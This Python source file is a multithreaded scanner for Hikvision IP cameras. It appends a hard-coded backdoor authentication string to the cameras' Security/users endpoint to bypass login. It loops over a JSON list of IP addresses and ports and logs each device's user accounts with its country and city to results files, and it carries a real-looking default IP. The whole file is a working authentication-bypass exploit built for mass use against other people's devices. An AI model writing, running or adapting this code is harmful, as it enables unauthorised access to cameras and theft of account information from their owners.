import requests
import json
from xml.etree import ElementTree as ET
import concurrent.futures
import os
from datetime import datetime

class HikVisionScanner:
    BACKDOOR_AUTH_ARG = "auth=YWRmaW46MTEK"
    NAMESPACE = {'ns': 'http://www.hikvision.com/ver10/XMLSchema'}

    @staticmethod
    def get_url_base(cb_https, txt_ip='31.148.117.229', nud_port=80):
        scheme = "https" if cb_https else "http"
        return f"{scheme}://{txt_ip}:{nud_port}/"

    @staticmethod
    def process_users_response(response, ip, port, country, city):
        if response.status_code != 200:
            print("An error occurred")
            return

        doc = ET.fromstring(response.content)
        users = doc.findall('.//ns:User', HikVisionScanner.NAMESPACE)

        user_ids = {}
        user_names = []
        for user in users:
            user_id = user.find('ns:userName', HikVisionScanner.NAMESPACE).text
            user_name = user.find('ns:id', HikVisionScanner.NAMESPACE).text
            user_ids[user_id] = user_name
            user_names.append(user_name)
            
        if len(user_names) > 0:
            current_datetime = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
            result_file_path = os.path.join("results", f"results-{current_datetime}.txt")
            with open(result_file_path, "a+") as file:
                file.seek(0) 
                lines = file.readlines()
                if any(f"IP: {ip}" in line for line in lines):
                    return 
                file.write(f"IP: {ip} PORT: {port} | USERS: {', '.join(user_ids)} | LOCATION: {country}, {city}\n")

    @staticmethod
    def get_users(cb_https, ip, port, country, city):
        try:
            url = HikVisionScanner.get_url_base(cb_https, ip, port) + "Security/users?" + HikVisionScanner.BACKDOOR_AUTH_ARG
            response = requests.get(url)
            HikVisionScanner.process_users_response(response, ip, port, country, city)
        except Exception as e:
            print(f"Error while connecting to {ip}:{port}, error: {e}")

    @staticmethod
    def load_ips_and_ports(filename):
        with open(filename, "r") as file:
            data = json.load(file)

        with concurrent.futures.ThreadPoolExecutor() as executor:
            for item in data:
                ip = item["ip"]
                country = item["country"]
                city = item["city"]
                for port in item["ports"]:
                    print(f"Trying IP: {ip}, port: {port}")
                    executor.submit(HikVisionScanner.get_users, False, ip, port, country, city)

